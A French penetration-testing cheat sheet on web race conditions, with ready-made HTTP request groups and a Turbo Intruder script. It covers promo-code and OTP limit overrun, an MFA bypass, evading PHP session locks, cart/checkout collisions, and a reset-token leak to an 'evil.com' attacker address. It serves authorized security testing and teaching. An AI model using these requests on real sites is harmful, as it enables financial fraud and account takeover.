# Race Conditions (Concurrence) — Cheat Sheet

## 1. Périmètre et conventions

Cette fiche couvre la détection et l'exploitation des *race conditions* web, classées CWE-362 / CWE-367 (TOCTOU). Le mécanisme central : une application traite des requêtes concurrentes sans verrouillage adéquat, permettant à plusieurs flux d'interagir sur le même état entre la vérification et l'écriture.

**Familles de techniques couvertes :**

- **Limit Overrun** : dépassement d'une limite métier (code promo unique, solde bancaire, quota de votes, OTP/CAPTCHA) par envoi simultané de requêtes.
- **Séquences multi-étapes cachées** : exploitation d'une fenêtre entre deux sous-états internes d'une même opération (contournement MFA, fuite de jeton entre comptes).
- **Race conditions multi-endpoints** : collision entre deux routes distinctes partageant un état sous-jacent commun.
- **Construction partielle** : exploitation d'un objet temporairement incomplet pendant sa création.

**Outils :** Burp Suite (Repeater — mode groupe parallèle, paquet unique HTTP/2), Turbo Intruder (extension Burp, script Python), `curl`.

**Conditions générales :** techniques applicables uniquement sous autorisation écrite. L'exploitation sur un système de production peut générer des effets de bord irréversibles (incohérences financières, corruption de données).

**Conventions des exemples :**

| Placeholder | Signification |
|---|---|
| `cible.com` | Nom d'hôte fictif, à remplacer par la cible réelle autorisée |
| `<token>` / `<session>` | Jeton ou cookie à obtenir dans le contexte testé |
| `session_dediee_A/B` | Identifiants de session distincts obtenus par ré-authentification préalable |

> **Principe fondamental :** une collision « naturelle » rare en production n'indique pas l'absence de vulnérabilité — c'est précisément pourquoi la faille n'a pas été détectée. L'objectif est de synchroniser artificiellement les requêtes pour forcer la collision.

---

## 2. Tableau de repérage rapide

| Objectif | Technique ou syntaxe | Quand l'utiliser | Signal attendu | Limite principale |
|---|---|---|---|---|
| Confirmer un Limit Overrun | Envoyer N requêtes identiques en paquet unique HTTP/2 | Endpoint de rachat de code, vote, transfert, validation OTP | Résultat positif sur plusieurs réponses simultanées (ex. réduction appliquée N fois) | HTTP/2 requis côté cible ; verrouillage de session PHP peut annuler l'effet |
| Détecter une fenêtre TOCTOU | Comparer comportement séquentiel vs comportement en parallèle | Tout endpoint effectuant check → use → update sur une donnée critique | Déviation de code HTTP, de `Content-Length`, ou d'état observable après la rafale | Fenêtre peut être inférieure à quelques ms — paquet unique indispensable |
| Contourner un MFA par séquence cachée | Login + accès à ressource protégée envoyés en paquet unique | Authentification MFA multi-étapes | Accès à la ressource protégée sans saisie du second facteur | Fenêtre très courte ; nécessite HTTP/2 et synchronisation parfaite |
| Exploiter une race condition multi-endpoints | Deux routes distinctes envoyées en parallèle (même session) | Panier + checkout, ajout article + application code promo | Etat final incohérent (article non payé livré, code appliqué avant d'être validé) | Les deux routes doivent partager un état sous-jacent commun |
| Obtenir un jeton destiné à une autre session | Deux requêtes `/forgot-password` avec emails distincts en parallèle | Architecture à pool de workers insuffisamment cloisonné | Jeton de la victime retourné dans la réponse de l'attaquant | Dépend d'une implémentation défaillante du cloisonnement des threads |
| Contourner le verrouillage de session | Utiliser des PHPSESSID distincts pour chaque requête du groupe | Framework PHP sérialisant les requêtes d'une même session | Requêtes traitées effectivement en parallèle | Nécessite plusieurs sessions valides pour un même compte |
| Exploiter une construction partielle | Envoyer paramètre sous forme de tableau vide (`api-key[]=`) | Création d'objet en plusieurs étapes côté serveur | Objet créé avec attribut de sécurité non initialisé ou vide | Dépend du langage/framework et de l'ordre des opérations internes |

---

## 3. Techniques classées par objectif

### 3.1 Détecter — Prédire les endpoints à risque

**Objectif :** identifier les points d'entrée où une collision est exploitable avant tout envoi en parallèle.

**Quand l'utiliser :** en début de test, lors de la revue de la surface d'attaque.

**Critères de sélection (par priorité d'impact) :**

```text
— Authentification et gestion de session
    login, MFA, déconnexion, réinitialisation de mot de passe
— Opérations financières ou à valeur économique
    transferts, crédits de solde, codes promo, cartes cadeaux
— Limites d'usage à usage unique ou à quota
    votes, OTP, CAPTCHA, licences, plafonds de téléchargement
— Processus de commande multi-étapes
    panier, checkout, ajout/suppression d'article
```

**Signal à rechercher lors de la revue :** tout endpoint dont le traitement enchaîne une lecture de base de données (vérification d'état), une opération métier, et une écriture de base de données (mise à jour de l'état).

**Source :** cours fourni, section 5.1.

#### Benchmarking séquentiel (référence)

**Objectif :** établir le comportement attendu en exécution séquentielle, avant tout test en parallèle.

**Quand l'utiliser :** avant chaque test en parallèle, pour chaque endpoint cible.

**Méthode :** envoyer les requêtes une par une, noter :

```text
— Code HTTP de chaque réponse
— Content-Length de chaque réponse
— Contenu de la réponse (message, état retourné)
— État final en base observable via une requête de vérification
```

**Requête de vérification d'état post-test :**

```bash
curl -s "https://cible.com/api/account/balance" \
  -H "Authorization: Bearer <token>"
# Comparer le solde / compteur observé au solde / compteur théorique attendu
```

**Signal attendu :** comportement cohérent et répétable — servira de référence pour détecter les déviations lors du test en parallèle.

**Source :** cours fourni, section 5.2.

---

### 3.2 Confirmer — Envoi en parallèle

#### HTTP/2 — Single-Packet Attack (Burp Repeater)

**Objectif :** envoyer un groupe de requêtes dans un unique paquet TCP pour éliminer le jitter réseau et maximiser la probabilité de collision.

**Quand l'utiliser :** test de Limit Overrun, séquence multi-étapes, multi-endpoints — en priorité sur toute cible supportant HTTP/2.

**Prérequis :** cible supportant HTTP/2 (vérifiable dans Burp Suite : l'indication du protocole apparaît dans l'historique des requêtes).

**Procédure dans Burp Repeater :**

```text
1. Créer un groupe de requêtes (onglet "+" dans Repeater)
2. Ajouter N copies de la requête cible dans le groupe
3. S'assurer que le protocole négocié est HTTP/2
4. Clic sur la flèche du bouton d'envoi → "Send group in parallel"
5. Sélectionner le mode "Single-packet attack"
6. Observer les réponses : codes HTTP, Content-Length, timing, contenu
```

**Signal attendu :** déviation par rapport au comportement séquentiel — code HTTP inattendu (409, 500), `Content-Length` variant entre les réponses du groupe, ou effet de second ordre observable via une requête de vérification.

**Limites :** nécessite HTTP/2 côté cible. En cas de HTTP/1.1 uniquement, utiliser la technique du dernier octet (section 3.3).

**Source :** cours fourni, section 3.1.

#### HTTP/1 — Technique du dernier octet (Burp Repeater)

**Objectif :** minimiser le jitter réseau sous HTTP/1.1 en synchronisant l'envoi du dernier octet de chaque requête.

**Quand l'utiliser :** cible ne supportant que HTTP/1.1.

**Principe :**

```text
1. Pré-établir les connexions TCP pour chaque requête du groupe
2. Envoyer tous les octets de chaque requête sauf le dernier
3. Retenir volontairement le dernier octet sur chaque connexion
4. Envoyer simultanément le dernier octet sur toutes les connexions
```

**Signal attendu :** idem paquet unique, mais avec une probabilité de collision structurellement plus faible pour les fenêtres de tir inférieures à quelques millisecondes.

**Limites :** moins efficace que le paquet unique pour les fenêtres de tir très courtes — envisager de répéter davantage de tentatives pour compenser.

**Source :** cours fourni, section 3.1.

#### Turbo Intruder — Script Python (automatisation avancée)

**Objectif :** automatiser un grand volume de requêtes synchronisées avec contrôle fin du timing, impossible à réaliser manuellement dans Repeater.

**Quand l'utiliser :** nombre de requêtes important, logique conditionnelle, variation de paramètres entre requêtes concurrentes.

**Script de référence (single-packet attack) :**

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,   # toutes les requêtes sur une seule connexion TCP multiplexée
        engine=Engine.BURP2,       # moteur HTTP/2 obligatoire pour le paquet unique
    )

    # Mise en file derrière la "porte" — aucun envoi effectif à ce stade
    for letter in ['A', 'B']:
        engine.queue(target.req, gate='1')

    # Ouverture simultanée : toutes les requêtes partent au même instant
    engine.openGate('1')

def handleResponse(req, interesting):
    table.add(req)
```

**Paramètres clés :**

| Paramètre | Rôle |
|---|---|
| `Engine.BURP2` | Force HTTP/2 — prérequis du paquet unique |
| `concurrentConnections=1` | Toutes les requêtes sur une seule connexion TCP |
| `gate='1'` | Identifiant de porte — regroupe les requêtes à envoyer simultanément |
| `engine.queue(..., gate='1')` | Met une requête en file sans l'envoyer |
| `engine.openGate('1')` | Déclenche l'envoi simultané de toutes les requêtes de la porte |

**Source :** cours fourni, section 3.2.

---

### 3.3 Exploiter — Limit Overrun

**Objectif :** appliquer une limite métier (code promo, OTP, quota) plus d'une fois en exploitant la fenêtre TOCTOU entre la vérification et l'écriture.

**Quand l'utiliser :** endpoint identifié comme effectuant check → use → update sur une ressource à usage unique ou limitée.

**Requêtes de test (groupe à envoyer en parallèle) :**

```http
POST /redeem-promo HTTP/1.1
Host: cible.com
Cookie: session=<session>
Content-Type: application/json

{"code": "PROMO10"}
```

```http
POST /redeem-promo HTTP/1.1
Host: cible.com
Cookie: session=<session>
Content-Type: application/json

{"code": "PROMO10"}
```

*(Dupliquer la requête N fois dans le groupe Burp Repeater, N = 10 à 30 selon la largeur estimée de la fenêtre)*

**Signal attendu :** plusieurs réponses positives dans le groupe (réduction appliquée, OTP validé) là où une seule devrait l'être ; ou état final incohérent observable via une requête de vérification.

**Effets de second ordre à contrôler :**

```bash
# Vérifier l'état final après la rafale — ne pas se fier uniquement aux codes HTTP des réponses individuelles
curl -s "https://cible.com/api/orders" -H "Authorization: Bearer <token>"
curl -s "https://cible.com/api/balance" -H "Authorization: Bearer <token>"
```

**Limites :** si l'application utilise un verrou de session PHP, les requêtes du même groupe seront sérialisées (voir section 3.5).

**Source :** cours fourni, sections 2 et 5.

---

### 3.4 Exploiter — Séquence multi-étapes cachée (bypass MFA)

**Objectif :** accéder à une ressource protégée en interposant une requête dans la fenêtre entre deux sous-états internes d'une même opération.

**Quand l'utiliser :** authentification MFA, processus en plusieurs étapes où un état intermédiaire est potentiellement moins protégé.

**Principe du contournement MFA :**

```text
Fenêtre exploitable :
  Étape 1 : Validation du mot de passe → session "pré-MFA" créée
  [ FENÊTRE : session existe, contrôle MFA pas encore actif ]
  Étape 3 : Exigence MFA activée sur la session

Exploitation : envoyer en paquet unique
  Requête A → POST /login (mot de passe valide)
  Requête B → GET /dashboard (ressource post-MFA)
  Si B est traitée avant l'étape 3 → accès sans second facteur
```

**Requêtes à envoyer en paquet unique :**

```http
POST /login HTTP/1.1
Host: cible.com
Content-Type: application/json

{"username": "victime", "password": "motdepasse_valide"}
```

```http
GET /dashboard HTTP/1.1
Host: cible.com
Cookie: session=<session_obtenue_apres_etape_1>
```

**Signal attendu :** réponse 200 sur `/dashboard` sans avoir soumis le code MFA.

**Généralisation :** ce schéma s'applique à tout mécanisme impliquant plusieurs écritures d'état successives — vérification d'email, changement de mot de passe avec invalidation de session, processus de paiement en plusieurs étapes.

**Source :** cours fourni, section 4.

---

### 3.5 Contourner une contrainte — Verrouillage de session (PHP)

**Objectif :** éviter que le framework ne sérialise les requêtes du groupe derrière un verrou de session, annulant silencieusement tout effet de concurrence.

**Quand l'utiliser :** aucune collision observée malgré un envoi en parallèle parfaitement synchronisé ; cible PHP probable (header `X-Powered-By: PHP`, cookies `PHPSESSID`).

**Prérequis :** obtenir plusieurs sessions valides pour un même compte (par ré-authentification répétée si l'application ne les invalide pas).

**Requêtes avec sessions distinctes :**

```http
POST /redeem-promo HTTP/1.1
Host: cible.com
Cookie: PHPSESSID=session_dediee_A
Content-Type: application/json

{"code": "PROMO10"}
```

```http
POST /redeem-promo HTTP/1.1
Host: cible.com
Cookie: PHPSESSID=session_dediee_B
Content-Type: application/json

{"code": "PROMO10"}
```

**Signal attendu :** collisions désormais observées, le framework ne pouvant plus sérialiser des sessions distinctes derrière un même verrou.

**Limites :** nécessite que l'application permette plusieurs sessions simultanées actives pour un même compte.

**Source :** cours fourni, section 6.3.

---

### 3.6 Exploiter — Race condition multi-endpoints

**Objectif :** provoquer une collision entre deux routes distinctes partageant un état sous-jacent commun.

**Quand l'utiliser :** aucune collision sur le même endpoint répété ; deux routes distinctes manipulent le même panier, le même solde ou le même objet.

**Prérequis :** connexion réchauffée au préalable (une requête anodine préalable sur la connexion) pour éviter les délais d'initialisation faussant les résultats.

**Exemple panier / checkout :**

```http
POST /cart/add HTTP/1.1
Host: cible.com
Cookie: session=abc123

{"productId": 42, "quantity": 1}
```

```http
POST /cart/checkout HTTP/1.1
Host: cible.com
Cookie: session=abc123
```

*(Envoyer simultanément en paquet unique — le checkout peut valider le panier avant que l'ajout ne soit comptabilisé dans le total)*

**Signal attendu :** état final incohérent — article ajouté après validation mais inclus dans la commande, réduction appliquée à un total pré-modification.

**Source :** cours fourni, section 6.1.

---

### 3.7 Exploiter — Fuite de jeton entre comptes (paramètres distincts)

**Objectif :** obtenir le jeton de réinitialisation d'un autre compte en exploitant un pool de threads insuffisamment cloisonné.

**Quand l'utiliser :** après identification d'une architecture à pool de workers partagé pour des requêtes de réinitialisation.

**Requêtes à envoyer en parallèle :**

```http
POST /forgot-password HTTP/1.1
Host: cible.com
Content-Type: application/json

{"email": "attaquant@evil.com"}
```

```http
POST /forgot-password HTTP/1.1
Host: cible.com
Content-Type: application/json

{"email": "victime@cible.com"}
```

**Signal attendu :** le jeton de réinitialisation destiné à `victime@cible.com` est retourné dans la réponse adressée à la requête `attaquant@evil.com`.

**Source :** cours fourni, section 6.2.

---

## 4. Payloads et syntaxes représentatifs

| Intention | Payload / action de référence | Contexte | Variante utile | Différence apportée |
|---|---|---|---|---|
| Limit Overrun (code promo) | N copies identiques de `POST /redeem {"code": "PROMO10"}` en paquet unique | JSON body, endpoint de rachat | Augmenter N de 10 à 30 si aucune collision | Plus de requêtes = plus grande probabilité de tomber dans la fenêtre |
| Limit Overrun (vote/OTP) | N copies identiques de la requête de validation | JSON ou form-data | — | Même principe ; adapter le champ contenant le jeton/OTP |
| Bypass MFA | `POST /login` + `GET /ressource_protegee` en paquet unique | Deux routes différentes, même session | Tester avec `POST /login` + `POST /action_sensible` | Cibler d'autres ressources post-MFA si `/dashboard` est géré séparément |
| Bypass verrouillage de session | Requêtes identiques avec `PHPSESSID` distincts | Cible PHP avec verrouillage de session | Tokens API distincts si l'appli le permet | Même principe de dissociation du verrou |
| Race multi-endpoints | `POST /cart/add` + `POST /cart/checkout` en paquet unique | Panier partagé, même session | Adapter aux deux endpoints partageant l'état identifié | Le principe reste identique ; les routes changent |
| Construction partielle | `POST /api/create-resource` avec `api-key[]=` (tableau vide) | Corps `application/x-www-form-urlencoded` | Tester d'autres attributs sous forme de tableau vide | Chaque attribut de sécurité peut être ciblé individuellement |
| Fuite de jeton entre comptes | Deux `POST /forgot-password` avec emails distincts en parallèle | JSON body | Répéter avec d'autres emails victimes si le premier échoue | La collision dépend du scheduling du pool de threads |

---

## 5. Exemples de requêtes HTTP

### 5.1 Limit Overrun — Groupe de requêtes identiques (Burp Repeater)

```http
# Référence — comportement séquentiel attendu (1 seule requête)
POST /redeem-promo HTTP/1.1
Host: cible.com
Cookie: session=abc123
Content-Type: application/json

{"code": "PROMO10"}

# → Réponse attendue : 200 OK, réduction appliquée une fois
# → Deuxième envoi séquentiel → 400 ou 409 "Code déjà utilisé"
```

```http
# Test en parallèle — envoyer 15 copies de cette requête en paquet unique HTTP/2
POST /redeem-promo HTTP/1.1
Host: cible.com
Cookie: session=abc123
Content-Type: application/json

{"code": "PROMO10"}

# → Signal d'une collision : plusieurs réponses 200 dans le groupe
# → Vérification : GET /orders → plusieurs réductions appliquées
```

- **Changement clé :** mode d'envoi (séquentiel → paquet unique), pas le contenu de la requête.
- **Ce que cela ne prouve pas seul :** qu'un seul 200 dans le groupe = collision ; observer le ratio de succès ET l'état final.

### 5.2 Multi-endpoints — Panier + Checkout

```http
# Requête A — ajout d'article dans le panier
POST /cart/add HTTP/1.1
Host: cible.com
Cookie: session=abc123
Content-Type: application/json

{"productId": 42, "quantity": 1}
```

```http
# Requête B — validation de commande (envoyée simultanément avec A)
POST /cart/checkout HTTP/1.1
Host: cible.com
Cookie: session=abc123
```

- **Changement clé :** deux routes distinctes partageant l'état du panier, envoyées en parallèle.
- **Prérequis :** réchauffement de connexion par une requête anodine préalable.
- **Ce que cela ne prouve pas seul :** un seul test réussi — reproduire plusieurs fois.

### 5.3 Bypass verrouillage de session PHP

```http
# Requête A — session dédiée A
POST /redeem-promo HTTP/1.1
Host: cible.com
Cookie: PHPSESSID=aaaaaa111111
Content-Type: application/json

{"code": "PROMO10"}
```

```http
# Requête B — session dédiée B (même compte, session distincte)
POST /redeem-promo HTTP/1.1
Host: cible.com
Cookie: PHPSESSID=bbbbbb222222
Content-Type: application/json

{"code": "PROMO10"}
```

- **Changement clé :** `PHPSESSID` distinct sur chaque requête du groupe.
- **Pourquoi important :** PHP sérialise toutes les requêtes d'un même `PHPSESSID` — sessions distinctes = traitements parallèles effectifs.

---

## 6. Outils et commandes

| Outil | Fonction | Quand l'utiliser | Configuration minimale | Limite ou précaution |
|---|---|---|---|---|
| Burp Repeater — mode groupe parallèle | Envoi synchronisé d'un groupe de requêtes (paquet unique HTTP/2 ou dernier octet HTTP/1) | Tout test de race condition, exploration initiale | Créer un groupe de requêtes → "Send group in parallel" → "Single-packet attack" | Nécessite HTTP/2 côté cible pour le mode paquet unique |
| Turbo Intruder (extension Burp) | Automatisation avancée avec script Python, contrôle fin du timing et du volume | Grand nombre de requêtes, logique conditionnelle, variation de paramètres entre requêtes | `Engine.BURP2`, `concurrentConnections=1`, mécanisme `gate` | Nécessite HTTP/2 ; la logique Python doit être minimaliste pour ne pas introduire de délai |
| `curl` | Vérification des effets de second ordre après une rafale | Contrôle de l'état final (solde, compteur, liste d'utilisation) | `curl -s "https://cible.com/api/balance" -H "Authorization: Bearer <token>"` | Pas adapté à l'envoi synchronisé de requêtes multiples |

---

## 7. Signaux caractéristiques et vérifications

| Observation | Ce qu'elle peut indiquer | Vérification complémentaire | Conclusion à éviter |
|---|---|---|---|
| Plusieurs réponses 200 dans un groupe sur un endpoint à usage unique | Limit Overrun probable | Vérifier l'état final en base (compteur, solde, liste d'utilisations) via une requête de lecture | Qu'un seul 200 supplémentaire constitue une preuve — confirmer avec l'état final |
| Réponse 409 Conflict ou 500 dans le groupe | Détection partielle de collision côté serveur (lock non appliqué correctement) | Tester si une partie des requêtes a néanmoins abouti malgré l'erreur | Que 409/500 implique l'absence de vulnérabilité — peut indiquer une protection incomplète |
| `Content-Length` variant entre les réponses du groupe | Traitement divergent des requêtes parallèles | Lire le corps de chaque réponse pour identifier la différence de contenu | Que toute variation est significative — comparer au comportement séquentiel de référence |
| État final incohérent après la rafale (solde différent du théorique) | Effet de second ordre d'une race condition | Reproduire la rafale plusieurs fois pour confirmer la reproductibilité | Qu'un effet de second ordre isolé non reproductible constitue une preuve suffisante |
| Aucune collision malgré un envoi parfaitement synchronisé | Verrouillage de session PHP, ou fenêtre de tir inférieure à quelques µs | Tester avec des sessions distinctes (`PHPSESSID` différents) | Que l'absence de collision confirme la sécurité — le verrouillage de session masque silencieusement l'effet |
| Résultat incohérent uniquement observé une fois sur N tentatives | Race window très courte mais exploitable | Augmenter N ; s'assurer du réchauffement de connexion | Qu'une collision isolée est un faux positif — une occurrence unique reste un signal à investiguer |

**Contrôle comparatif systématique :** toujours établir le comportement séquentiel de référence avant le test en parallèle, et vérifier l'état final après chaque rafale via une requête de lecture indépendante.

---

## 8. Variantes de syntaxe et adaptation

#### Adapter le nombre de requêtes dans le groupe

**Problème précis :** aucune collision observée malgré un envoi en paquet unique.

**Pourquoi pertinent :** une fenêtre de tir très courte nécessite plus de requêtes simultanées pour avoir une probabilité suffisante de collision.

**Ce qui change :** uniquement N (nombre de copies dans le groupe), pas le contenu ni la technique.

| Fenêtre estimée | N recommandé |
|---|---|
| Large (dizaines de ms) | 5–10 |
| Étroite (quelques ms) | 15–25 |
| Très étroite (< 1 ms) | 25–30 (limite du paquet unique) |

#### Réchauffement de connexion avant une attaque multi-endpoints

**Problème précis :** la première requête du groupe subit un délai d'initialisation (TLS handshake, allocation de workers) faussant les résultats.

**Ce qui change :** ajouter une requête préalable anodine (GET sur une ressource publique) sur la connexion avant d'envoyer le groupe de test.

**Ce qu'il faut conserver identique :** le contenu et le timing du groupe de test après le réchauffement.

#### Passer du paquet unique au dernier octet (HTTP/1.1 uniquement)

**Problème précis :** la cible ne supporte pas HTTP/2.

**Ce qui change :** technique d'envoi dans Burp Repeater (mode "Send group in parallel" sans "single-packet attack").

**Impact :** probabilité de collision structurellement plus faible pour les fenêtres très courtes — compenser par un N plus élevé et davantage de tentatives répétées.

---

## 9. Diagnostic rapide des erreurs

| Problème constaté | Causes possibles | Vérification à effectuer | Ajustement pertinent | Ce que cela permet de conclure |
|---|---|---|---|---|
| Aucune collision malgré paquet unique | Verrouillage de session PHP, ou HTTP/2 non négocié, ou fenêtre de tir < µs | Vérifier le protocole négocié ; tester avec des `PHPSESSID` distincts | Dissocier les sessions (section 3.5) ; vérifier si HTTP/2 est activé | Que l'une de ces causes explique l'absence — pas que l'endpoint est sécurisé |
| HTTP/2 non disponible sur la cible | Infrastructure ne supportant que HTTP/1.1 (CDN, reverse proxy) | Vérifier dans Burp l'indicateur de protocole sur les réponses | Utiliser la technique du dernier octet, augmenter N | Que le paquet unique n'est pas applicable ici — pas que la race condition est inexploitable |
| Résultats non reproductibles (collision 1/20) | Fenêtre de tir très courte ou charge serveur variable | Répéter la rafale plusieurs fois ; tester en dehors des pics de charge | Augmenter N ; réchauffer la connexion | Que la vulnérabilité existe mais que la reproductibilité nécessite plus d'itérations |
| Réponse 409 sur toutes les requêtes du groupe | Protection par contrainte d'unicité SGBD ou lock applicatif | Vérifier si l'état final est cohérent malgré le 409 | Si l'état reste cohérent : protection fonctionnelle ; sinon : collision partielle | Que 409 sur toutes les réponses indique une protection probable — mais vérifier l'état final avant de conclure |
| Construction partielle sans effet observable | Le framework initialise tous les attributs dans la même transaction | Tester avec des paramètres différents sous forme de tableau vide | Explorer d'autres attributs créés en étapes distinctes | Que ce paramètre précis est protégé — pas que l'objet entier est créé atomiquement |
| Fuite de jeton entre comptes non reproductible | Cloisonnement du pool de threads suffisant, ou scheduling défavorable | Répéter plusieurs dizaines de fois ; varier les accounts cibles | Augmenter le volume de tentatives | Que la non-reproductibilité ne prouve pas l'absence de vulnérabilité sur une architecture à workers partagés |

---

## 10. Checklist d'utilisation

- [ ] Les endpoints critiques (opérations check → use → update) sont identifiés et priorisés par impact métier avant tout test.
- [ ] Le comportement séquentiel de référence est établi avant chaque test en parallèle.
- [ ] Le protocole négocié avec la cible est vérifié (HTTP/2 pour le paquet unique).
- [ ] La présence d'un verrouillage de session PHP est testée (sessions distinctes si nécessaire).
- [ ] La connexion est réchauffée par une requête préalable anodine avant les tests multi-endpoints.
- [ ] L'état final est vérifié via une requête de lecture indépendante après chaque rafale.
- [ ] Plusieurs réponses 200 dans le groupe ET un état final incohérent sont tous deux documentés comme preuve.
- [ ] La collision est reproduite au moins 3 fois avant d'être documentée comme finding confirmé.
- [ ] Le PoC final est minimal (en-têtes inutiles retirés) et sa reproductibilité est évaluée.
- [ ] Les effets de bord potentiels irréversibles (incohérences financières, corruption de données) sont pris en compte avant de lancer des tests sur des environnements autres que les labs dédiés.

---

## 11. Sources et liens de référence

- [PortSwigger Web Security Academy — Race Conditions](https://portswigger.net/web-security/race-conditions)
- [PortSwigger Research — Smashing the state machine: the true potential of web race conditions](https://portswigger.net/research/smashing-the-state-machine)
- [PortSwigger Research — Single-packet attacks: the next generation of HTTP race condition attacks](https://portswigger.net/research/single-packet-attacks)
- [OWASP Testing Guide — Testing for Race Conditions](https://owasp.org/www-project-web-security-testing-guide/)
- [MITRE CWE-362 — Concurrent Execution using Shared Resource with Improper Synchronization](https://cwe.mitre.org/data/definitions/362.html)
- [MITRE CWE-367 — Time-of-check Time-of-use (TOCTOU) Race Condition](https://cwe.mitre.org/data/definitions/367.html)
